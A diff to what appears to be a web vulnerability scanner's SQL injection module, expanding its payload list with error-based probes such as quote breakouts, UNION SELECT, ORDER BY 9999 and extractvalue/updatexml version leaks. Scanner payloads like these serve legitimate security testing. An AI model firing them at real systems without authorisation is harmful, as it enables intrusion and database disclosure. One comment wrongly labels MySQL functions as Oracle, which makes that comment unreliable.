@@ -371,7 +371,33 @@ class ModuleSql(Attack):
     """
     time_to_sleep = 6
     name = "sql"
-    payloads = ["[VALUE]\xBF'\"("]
+    payloads = [
+        # Original payload: multi-byte GBK encoding bypass + quotes + parenthesis
+        "[VALUE]\xBF'\"(",
+        # Backtick for MySQL column/table name context
+        "[VALUE]`",
+        # Nested parentheses closure (common in subqueries)
+        "[VALUE]'))",
+        "[VALUE]\"))",
+        # Comment-based truncation payloads
+        "[VALUE]'--",
+        "[VALUE]\"--",
+        "[VALUE]'#",
+        # Numeric context injection (no quotes needed)
+        "[VALUE] AND 1=CONVERT(int,@@version)--",
+        # UNION-based error payloads (type mismatch forces error disclosure)
+        "[VALUE]' UNION SELECT NULL--",
+        "[VALUE]\" UNION SELECT NULL--",
+        # ORDER BY with out-of-range index (triggers column count error)
+        "[VALUE]' ORDER BY 9999--",
+        "[VALUE]\" ORDER BY 9999--",
+        # Division by zero (arithmetic error disclosure)
+        "[VALUE]/0",
+        "[VALUE]' AND 1/0--",
+        # Oracle XML error-based (extractvalue / updatexml)
+        "[VALUE]' AND extractvalue(1,concat(0x7e,version()))--",
+        "[VALUE]' AND updatexml(1,concat(0x7e,version()),1)--",
+    ]
     filename_payload = "'\"("  # TODO: wait for https://github.com/shazow/urllib3/pull/856 then use that for files upld
     parallelize_attacks = True
 
